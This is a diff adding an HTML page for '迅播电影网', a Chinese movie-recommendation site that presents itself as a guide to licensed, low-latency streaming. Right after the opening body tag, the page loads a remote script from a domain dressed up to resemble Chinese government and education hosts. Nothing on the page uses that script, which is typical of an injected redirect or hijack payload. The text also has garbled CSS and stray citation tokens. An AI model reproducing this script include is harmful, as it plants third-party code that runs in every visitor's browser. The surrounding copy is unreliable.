@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>迅播电影网 - 光纤极速电影推荐与正版点播导览</title>
+<meta name="description" content="迅播电影网(xunbodianyingwang-top.github.io)以光纤极速与低延迟理念推荐电影，提供极速片单、缓冲优化、多端适配与正版点播说明等栏目，只做合法影讯与正版观看入口示意，网址：https://xunbodianyingwang-top.github.io">
+<meta name="keywords" content="迅播电影网, xunbodianyingwang-top, 光纤极速电影, 低延迟点播, 正版电影推荐, 多端适配片单">
+<meta name="author" content="迅播电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;background:#04121f;color:#dff3ff;line-height:1.7;overflow-x:hidden}
+a{text-decoration:none;color:#36e0ff;transition:.2s}
+a:hover{color:#fff}
+.container{width:92%;max-width:1200px;margin:0 auto}
+:root{--bg:#04121f;--panel:#07283f;--line:#0e4straight;--line:#0e496f;--cyan:#36e0ff;--blue:#2f7bff;--green:#37e0a0;--amber:#ffc24b;--red:#ff6b81;--muted:#8fb6cf}
+
+.header{position:fixed;top:0;width:100%;z-index:100;background:rgba(4,18,31,.96);border-bottom:2px solid var(--cyan)}
+.header-in{display:flex;justify-content:space-between;align-items:center;padding:.8rem 0}
+.logo{font-size:1.5rem;font-weight:900;letter-spacing:2px;color:#fff}
+.logo span{color:var(--cyan)}
+.nav-links{display:flex;gap:.5rem;flex-wrap:wrap}
+.nav-links a{padding:.45rem .9rem;border:1px solid var(--line);background:var(--panel);color:#dff3ff;font-weight:700;font-size:.8rem;letter-spacing:1px}
+.nav-links a:hover{background:var(--cyan);color:#04121f;border-color:var(--cyan)}
+.mob-btn{display:none;background:var(--cyan);border:1px solid #04121f;color:#04121f;font-weight:900;font-size:1.1rem;padding:.3rem .8rem;cursor:pointer}
+
+.hero{padding:8.5rem 0 5rem;background:
+radial-gradient(circle at 85% 10%,rgba(54,224,255,.12),transparent 35%),
+radial-gradient(circle at 10% 90%,rgba(47,123,255,.12),transparent 40%),#04121f;border-bottom:2px solid var(--line);position:relative}
+.hero::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,rgba(54,224,255,.05) 0 1px,transparent 1px 28px);pointer-events:none}
+.hero-grid{display:grid;grid-template-columns:1.25fr .75fr;gap:3rem;align-items:center;position:relative;z-index:1}
+.hero h1{font-size:clamp(2.4rem,6vw,4.4rem);font-weight:900;line-height:1.05;color:#fff;margin-bottom:1rem;letter-spacing:.5px}
+.hero h1 .hl{color:var(--cyan)}
+.hero-url{display:inline-block;padding:.7rem 1rem;border:1px dashed var(--cyan);background:var(--panel);font-family:monospace;font-size:.95rem;color:var(--cyan);margin-bottom:1.1rem}
+.hero-url:hover{background:var(--cyan);color:#04121f}
+.hero-desc{font-size:1rem;max-width:560px;margin-bottom:1.6rem;color:#bfe2f5}
+.hero-cta{display:inline-block;padding:.85rem 2rem;background:var(--green);color:#04121f;border:1px solid #04121f;font-weight:900;letter-spacing:2px}
+.hero-cta:hover{background:var(--cyan)}
+.metrics{display:flex;gap:1rem;flex-wrap:wrap;margin-top:1.8rem}
+.metric{border:1px solid var(--line);background:var(--panel);padding:.7rem 1rem;min-width:120px}
+.metric b{display:block;font-size:1.3rem;color:var(--cyan);font-family:monospace}
+.metric span{font-size:.74rem;color:var(--muted)}
+
+.gauge{width:230px;height:230px;margin:0 auto;position:relative;border-radius:50%;background:conic-gradient(var(--green) 0 82%,var(--line) 82% 100%);display:flex;align-items:center;justify-content:center}
+.gauge::before{content:"";position:absolute;inset:22px;border-radius:50%;background:var(--panel);border:1px solid var(--line)}
+.gauge .val{position:relative;text-align:center}
+.gauge .val b{font-size:2.2rem;color:var(--green);font-family:monospace}
+.gauge .val span{display:block;font-size:.78rem;color:var(--muted)}
+
+.section{padding:5rem 0;border-bottom:2px solid var(--line);background:var(--bg)}
+.section.alt{background:var(--panel)}
+.sec-head{margin-bottom:2.6rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap}
+.sec-no{background:var(--cyan);color:#04121f;font-weight:900;padding:.25rem .8rem;letter-spacing:2px;font-size:.85rem;border:1px solid #04121f}
+.sec-head h2{font-size:2rem;font-weight:900;color:#fff}
+.sec-head p{font-size:.9rem;color:var(--muted);width:100%}
+
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:1.4rem}
+.card{border:1px solid var(--line);background:var(--panel);padding:0;transition:.2s;overflow:hidden}
+.card:hover{transform:translateY(-4px);box-shadow:0 0 0 1px var(--cyan),6px 6px 0 rgba(54,224,255,.12)}
+.card-top{display:flex;justify-content:space-between;align-items:center;padding:.6rem .9rem;border-bottom:1px solid var(--line);background:#052033;font-family:monospace;font-size:.78rem}
+.card-top .id{color:var(--cyan);font-weight:900}
+.card-top .rate{color:var(--green);font-weight:900}
+.card-body{padding:1.1rem}
+.card-body h3{font-size:1.15rem;font-weight:900;color:#fff;margin-bottom:.4rem}
+.card-body p{font-size:.85rem;color:#bfe2f5;margin-bottom:.8rem}
+.chips{display:flex;gap:.5rem;flex-wrap:wrap;font-size:.74rem}
+.chips span{border:1px solid var(--line);padding:.15rem .6rem;color:var(--muted)}
+.chips .ok{color:var(--green);border-color:var(--green)}
+.chips .hd{color:var(--cyan);border-color:var(--cyan)}
+
+.buf{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1.4rem}
+.buf-card{border:1px solid var(--line);background:var(--panel);padding:1.3rem}
+.buf-card h3{font-size:1.1rem;font-weight:900;color:#fff;margin-bottom:.5rem}
+.buf-card p{font-size:.84rem;color:#bfe2f5;margin-bottom:.8rem}
+.bar{height:10px;background:#052033;border:1px solid var(--line);position:relative;margin-bottom:.5rem}
+.bar i{position:absolute;left:0;top:0;height:100%;display:block}
+.bar b{font-size:.7rem;color:var(--muted);font-family:monospace}
+.bar.b1 i{width:96%;background:var(--green)}
+.bar.b2 i{width:90%;background:var(--cyan)}
+.bar.b3 i{width:84%;background:var(--amber)}
+.bar.b4 i{width:78%;background:var(--blue)}
+
+.devices{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1.4rem}
+.dev{border:1px solid var(--line);background:var(--panel);padding:1.3rem;position:relative}
+.dev .ico{font-family:monospace;font-size:.8rem;color:var(--cyan);border:1px solid var(--line);display:inline-block;padding:.15rem .6rem;margin-bottom:.7rem}
+.dev h3{font-size:1.05rem;font-weight:900;color:#fff;margin-bottom:.4rem}
+.dev p{font-size:.84rem;color:#bfe2f5}
+.dev ul{margin:.6rem 0 0 1.1rem;font-size:.82rem;color:#bfe2f5}
+
+.legal{max-width:900px;margin:0 auto;border:1px solid var(--cyan);background:var(--panel);padding:2.4rem}
+.legal h3{font-size:1.6rem;font-weight:900;color:#fff;margin-bottom:1rem}
+.legal p{font-size:.96rem;color:#bfe2f5;margin-bottom:.9rem}
+.legal ul{margin:0 0 1rem 1.2rem;font-size:.9rem;color:#bfe2f5}
+.legal a.about-url{display:inline-block;margin-top:.6rem;padding:.9rem 1.5rem;border:1px dashed var(--cyan);font-family:monospace;color:var(--cyan);font-weight:700}
+.legal a.about-url:hover{background:var(--cyan);color:#04121f}
+.disclaimer{margin-top:1.1rem;font-size:.8rem;color:var(--muted);border-top:1px dashed var(--line);padding-top:1rem}
+
+.footer{background:#03101b;color:#bfe2f5;padding:3rem 0 1.5rem}
+.footer-brand{font-size:1.7rem;font-weight:900;color:#fff}
+.footer-brand span{color:var(--cyan)}
+.footer p{font-size:.86rem;margin-bottom:.4rem;color:var(--muted)}
+.footer-nav{display:flex;gap:1rem;flex-wrap:wrap;margin:1.4rem 0}
+.footer-nav a{border:1px solid var(--line);padding:.4rem .9rem;font-size:.8rem;color:#dff3ff}
+.footer-nav a:hover{background:var(--cyan);color:#04121f;border-color:var(--cyan)}
+.footer-copy{font-size:.74rem;color:#5f7e93;margin-top:1.6rem;padding-top:1.4rem;border-top:1px solid var(--line)}
+
+@media(max-width:768px){
+.nav-links{display:none;position:absolute;top:100%;left:0;width:100%;flex-direction:column;background:#04121f;border-bottom:2px solid var(--cyan);padding:1rem 0}
+.nav-links.open{display:flex}
+.nav-links a{border-bottom:1px solid var(--line);text-align:center;margin:0 1rem}
+.mob-btn{display:block}
+.hero{padding:7rem 0 3rem}
+.hero-grid{grid-template-columns:1fr}
+.gauge{width:190px;height:190px;margin-top:1.5rem}
+.sec-head h2{font-size:1.6rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="header">
+  <div class="container header-in">
+    <div class="logo">迅播<span>电影网</span></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">总控</a>
+      <a href="#fast">极速片单</a>
+      <a href="#buffer">缓冲优化</a>
+      <a href="#devices">多端适配</a>
+      <a href="#legal">正版点播</a>
+    </nav>
+    <button class="mob-btn" onclick="document.getElementById('navLinks').classList.toggle('open')">☰</button>
+  </div>
+</header>
+
+<section id="home" class="hero">
+  <div class="container hero-grid">
+    <div>
+      <h1>迅播电影网·<span class="hl">光纤极速</span>选片</h1>
+      <div class="hero-url">https://xunbodianyingwang-top.github.io</div>
+      <p class="hero-desc">迅播电影网（xunbodianyingwang-top.github.io）按低延迟、稳定码率、多端适配的思路推荐电影。只做合法影讯、极速片单与正版点播入口示意，不提供盗版资源、不内置未授权播放源、不引导网盘下载。</p>
+      <a href="#fast" class="hero-cta">查看极速片单 →</a>
+      <div class="metrics">
+        <div class="metric"><b>82%</b><span>示例推荐命中率</span></div>
+        <div class="metric"><b>&lt;1s</b><span>正版预览起播示意</span></div>
+        <div class="metric"><b>4K/HD</b><span>按授权码率分发</span></div>
+        <div class="metric"><b>5端</b><span>手机/平板/电视/PC/盒子</span></div>
+      </div>
+    </div>
+    <div class="gauge" aria-label="极速指数示意">
+      <div class="val"><b>82</b><span>极速指数 / 示例</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="fast" class="section">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-no">S1</span>
+      <div><h2>极速片单</h2><p>按起播速度、码率稳定与正版状态标注，适合低延迟观看</p></div>
+    </div>
+    <div class="cards">
+      <div class="card">
+        <div class="card-top"><span class="id">XB-201</span><span class="rate">极速 96</span></div>
+        <div class="card-body">
+          <h3>小森林（四季场）</h3>
+          <p>慢食田园、低动态画面，对码率压力小，适合弱网也能稳定流畅看。</p>
+          <div class="chips"><span class="ok">正版点播</span><span class="hd">HD/4K修复</span><span>低缓冲</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-top"><span class="id">XB-202</span><span class="rate">极速 90</span></div>
+        <div class="card-body">
+          <h3>头号玩家</h3>
+          <p>高码率特效片，建议有线/5G或正版平台自动码率；彩蛋类适合二次刷。</p>
+          <div class="chips"><span class="ok">授权点播</span><span class="hd">4K可选</span><span>高动态</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-top"><span class="id">XB-203</span><span class="rate">极速 84</span></div>
+        <div class="card-body">
+          <h3>柏林苍穹下</h3>
+          <p>文艺黑白转彩色，码率适中；夜间场配正版修复源，弱灯低延迟看更稳。</p>
+          <div class="chips"><span class="ok">正版修复</span><span class="hd">HD</span><span>文艺</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-top"><span class="id">XB-204</span><span class="rate">极速 88</span></div>
+        <div class="card-body">
+          <h3>步履不停</h3>
+          <p>家庭剧情、对话驱动，小码率也能清晰；适合手机/平板通勤点播。</p>
+          <div class="chips"><span class="ok">中字点播</span><span class="hd">HD</span><span>低带宽</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-top"><span class="id">XB-205</span><span class="rate">极速 78</span></div>
+        <div class="card-body">
+          <h3>千与千寻（夜场）</h3>
+          <p>动画细节多，建议自动码率；正版授权平台按网络状况切720/1080/4K。</p>
+          <div class="chips"><span class="ok">授权重映</span><span class="hd">4K可选</span><span>动画</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-top"><span class="id">XB-206</span><span class="rate">延后</span></div>
+        <div class="card-body">
+          <h3>院线下线新片</h3>
+          <p>新片按版权方要求延后开窗，正版平台按会员/单片付费提供，不提供同期盗版源。</p>
+          <div class="chips"><span class="ok">延后点播</span><span class="hd">按授权</span><span>合规</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="buffer" class="section alt">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-no">S2</span>
+      <div><h2>缓冲优化</h2><p>示例网络/码率建议，实际以正版平台与本地网络为准</p></div>
+    </div>
+    <div class="buf">
+      <div class="buf-card">
+        <h3>弱网 720p</h3>
+        <div class="bar b1"><i></i><b>推荐≥2Mbps</b></div>
+        <p>对话片、纪录片、老片修复HD优先；关闭其他下载，用正版平台自动降码率最稳。</p>
+      </div>
+      <div class="buf-card">
+        <h3>家用 1080p</h3>
+        <div class="bar b2"><i></i><b>推荐≥5Mbps</b></div>
+        <p>家庭剧情、动画常规场；优先有线或5G近路由，减少同频干扰导致的起播延迟。</p>
+      </div>
+      <div class="buf-card">
+        <h3>高速 4K修复</h3>
+        <div class="bar b3"><i></i><b>推荐≥25Mbps</b></div>
+        <p>4K修复老片、特效大片用正版源；如波动大，改自动码率比强制4K更不容易卡。</p>
+      </div>
+      <div class="buf-card">
+        <h3>多端同看</h3>
+        <div class="bar b4"><i></i><b>按并发叠加</b></div>
+        <p>手机+电视+平板同时点播，按设备数预留带宽；正版账号并发限制以平台规则为准。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="devices" class="section">
+  <div class="container">
+    <div class="sec-head">
+      <span class="sec-no">S3</span>
+      <div><h2>多端适配</h2><p>按设备给点播与画质建议，提升起播成功率</p></div>
+    </div>
+    <div class="devices">
+      <div class="dev"><span class="ico">MOBILE</span><h3>手机</h3><p>通勤碎片观看，优先自动码率与中码率片单。</p><ul><li>竖屏导航、锚点选片</li><li>弱网默认720p/1080p</li><li>正版App/网页均可</li></ul></div>
+      <div class="dev"><span class="ico">TABLET</span><h3>平板</h3><p>卧室/差旅慢看，动画与家庭片更合适。</p><ul><li>1080p为主</li><li>字幕尺寸可放大</li><li>正版离线缓存按授权</li></ul></div>
+      <div class="dev"><span class="ico">PC</span><h3>电脑</h3><p>资料片、修复片、长片，码率选择最灵活。</p><ul><li>有线网络更稳</li><li>4K需平台与屏幕支持</li><li>多标签查片单</li></ul></div>
+      <div class="dev"><span class="ico">TV/BOX</span><h3>电视/盒子</h3><p>家庭场、夜场大屏，优先正版TV端授权。</p><ul><li>自动码率防卡顿</li><li>audio按正版源选轨</li><li>新片延后按版权开窗</li></ul></div>
+    </div>
+  </div>
+</section>
+
+<section id="legal" class="section alt">
+  <div class="container">
+    <div class="legal">
+      <h3>正版点播说明·关于迅播电影网</h3>
+      <p>迅播电影网（网址：https://xunbodianyingwang-top.github.io）是电影推荐与正版点播导览单页。我们以“光纤极速、低延迟、稳定码率、多端适配”组织片单，但本站不直接托管未授权视频，也不提供盗版下载。</p>
+      <ul>
+        <li>老片/修复片/动画：优先标注正版平台可点播状态，按授权提供HD/4K。</li>
+        <li>院线新片：通常按版权方要求晚于首映开放网络点播，不提供同期盗版源。</li>
+        <li>实际观看：通过具备《信息网络传播视听节目许可证》等相应资质的正版平台或正规影院；会员、单片付费、地域限制以平台当期规则为准。[2,4](@ref)</li>
+        <li>网络优化：仅给带宽/码率/多端建议，不诱导安装第三方播放器、不跳网盘。</li>
+      </ul>
+      <a href="#" class="about-url">https://xunbodianyingwang-top.github.io</a>
+      <div class="disclaimer">合规声明：本页为示例展示，不承诺具体片源可用；极速指数、缓冲指标均为示意。盗版聚合站可能存在弹窗、恶意软件与著作权风险，建议优先使用正版渠道。[2,9](@ref)</div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="container">
+    <div class="footer-brand">迅播<span>电影网</span></div>
+    <p>网址：https://xunbodianyingwang-top.github.io</p>
+    <p>关键词：迅播电影网 / xunbodianyingwang-top / 光纤极速 / 正版低延迟点播</p>
+    <div class="footer-nav">
+      <a href="#home">总控</a>
+      <a href="#fast">极速片单</a>
+      <a href="#buffer">缓冲优化</a>
+      <a href="#devices">多端适配</a>
+      <a href="#legal">正版点播</a>
+    </div>
+    <div class="footer-copy">© 2026 迅播电影网(xunbodianyingwang-top) · 示例展示页 · 内链使用 # 占位 · 不生成 robots.txt 与 sitemap.xml · 仅作合法影讯/正版点播示意，不提供盗版资源</div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('navLinks').classList.remove('open');});
+});
+</script>
+</body>
+</html>
